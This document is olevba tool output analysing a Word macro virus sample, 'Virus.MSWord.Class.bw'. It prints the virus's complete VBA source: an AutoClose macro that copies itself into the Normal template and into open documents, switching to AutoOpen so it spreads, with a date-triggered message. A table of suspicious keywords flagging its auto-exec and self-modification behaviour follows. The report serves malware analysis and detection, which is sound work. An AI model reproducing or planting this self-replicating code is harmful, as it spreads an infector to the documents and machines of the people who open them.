olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.bw
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.bw - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



























Sub AutoClose()
'1nternal
On Error GoTo BreakOut
Set N = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set A = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Options.VirusProtection = True
Options.SaveNormalPrompt = True
Options.ConfirmConversions = True
If Day(Now) = 16 And (Month(Now) = 10) Then MsgBox "1nternal / Class.Insert"
If N.Lines(29, 1) = "'1nternal" Then GoTo TestA
    For I = 1 To 50
        N.InsertLines I, A.Lines(I, 1)
    Next I
    N.ReplaceLine 28, "Sub AutoClose()"
TestA:
If A.Lines(29, 1) = "'1nternal" Then GoTo BreakOut
    For I = 1 To 50
        A.InsertLines I, N.Lines(I, 1)
    Next I
    A.ReplaceLine 28, "Sub AutoOpen()"
BreakOut:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

